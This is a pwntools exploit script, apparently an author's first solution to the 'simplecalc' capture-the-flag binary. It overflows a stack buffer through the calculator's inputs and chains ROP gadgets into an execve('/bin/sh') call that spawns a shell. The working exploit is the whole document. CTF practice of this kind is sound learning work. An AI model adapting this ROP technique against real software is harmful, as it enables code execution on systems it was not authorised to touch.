# My  first ever automated script to exploit sbuffer overflow  by using ROPGadget attaque 
# i had an issue for a while with the free() before the return but i fucked it by overwiritng the variable with zero if(i == 13 or i == 12)
# not proud of how complicated it is there are simple solutions for this 
from pwn import *
p = process('./simplecalc')


listValuesByOrder = [
0x44db34, # pop rax ; ret
#the qddresse we wanna pass to rax let me search in the memory start of .data section
0x6c1060,
#end
#pop rdx ; ret  we pass here the 0x0068732f2f6e69622f shell
0x437a85,
#shell passed to rdx
0x0068732f6e69622f,
#we search for something like [rax],rdx     to move the shell to the address inside rax
0x44526e, # move [rax],rdx
#end
0x44db34,
0x3B,
0x401b73,
#0x0068732f6e69622f
0x6c1060,
0x401c87,
0x0,
0x437a85,
0x0,
0x400488
]

counter = 0
valuesCounter = 0
Low_High = "low"
High = 0
Low = 0

def calculx_y(addr):
    y = 40
    x = addr - y

    if x <= 39:
        # Si le nombre est trop petit pour une addition 
        # on utilise une SOUSTRACTION (option 2) : x - y = cible -> x = cible + y
        # Exemple pour 59 : y=40, x=59+40=99. 99 > 39 et 40 > 39. C'est parfait !
        y = 40
        x = addr + y
        return [b'2', x, y] # Option 2 (subs)

    return [b'1', x, y] # Option 1 (adds)

p.recvuntil(b'calculations: ')
p.sendline(b'47')
for i in range(0,18):
    # complete the stack overflow
    print("iteration :",i)
    p.recvuntil(b'=> ')
    if i==12 or i == 13:
        p.sendline(b'2')
        p.recvuntil(b'x: ')
        p.sendline(b'50')
        p.recvuntil(b'y: ')
        p.sendline(b'50')
        continue


    p.sendline(b'1')
    p.recvuntil(b'x: ')
    p.sendline(b'40')
    p.recvuntil(b'y: ')
    p.sendline(b'40')
    counter +=1

    if i == 17 :
        #start chaining the gadgets
        for i in range (0,28):
            counter+=1
            p.recvuntil(b'=> ')
            if listValuesByOrder[valuesCounter] == 0x0:

                p.sendline(b'2')
                p.recvuntil(b'x: ')
                if(Low_High  == 'low'):
                    print("counter value :",valuesCounter)
                    print(hex(0x00000000),'|')
                    p.sendline(b'50')
                    p.recvuntil(b'y: ')
                    p.sendline(b'50')

                    Low_High = 'high'

                    continue
                if(Low_High == 'high'):
                    print(hex(0x00000000))
                    p.sendline(b'50')
                    p.recvuntil(b'y: ')
                    p.sendline(b'50')
                    Low_High = 'low'
                    valuesCounter+=1
                    continue
            elif Low_High == 'high' and ((listValuesByOrder[valuesCounter] >> 32) == 0x00000000):

                p.sendline(b'2')
                p.recvuntil(b'x: ')
                print("we are in the elif statement",hex(0x00000000))
                p.sendline(b'50')
                p.recvuntil(b'y: ')
                p.sendline(b'50')
                Low_High = 'low'
                valuesCounter+=1
                continue
            else:



                if(Low_High == 'low'):
                    Low = listValuesByOrder[valuesCounter] & 0x00000000ffffffff
                    print("counter value :",valuesCounter)
                    print("we are in the else statement :",hex(Low))
                    coordinates = calculx_y(Low)
                    if(coordinates[0]== b'1'):
                        p.sendline(b'1')

                    else:
                        p.sendline(b'2')
                    p.recvuntil(b'x: ')
                    x = str(coordinates[1]).encode()
                    p.sendline(x)
                    p.recvuntil(b'y: ')
                    y = str(coordinates[2]).encode()
                    p.sendline(y)
                    Low_High = 'high'
                    continue
                if(Low_High == 'high'):
                    High = listValuesByOrder[valuesCounter] >> 32

                    print("we are in the High else statement :",hex(High))
                    
                    coordinates = calculx_y(High)
                    if(coordinates[0]== b'1'):
                        p.sendline(b'1')

                    else:
                        p.sendline(b'2')
                    p.recvuntil(b'x: ')

                    x = str(coordinates[1]).encode()
                    p.sendline(x)
                    p.recvuntil(b'y: ')
                    y = str(coordinates[2]).encode()
                    p.sendline(y)
                    valuesCounter+=1
                    Low_High = 'low'

print("all iterations: ",counter)
p.recvuntil(b'=> ')
p.sendline(b'5')
p.interactive()
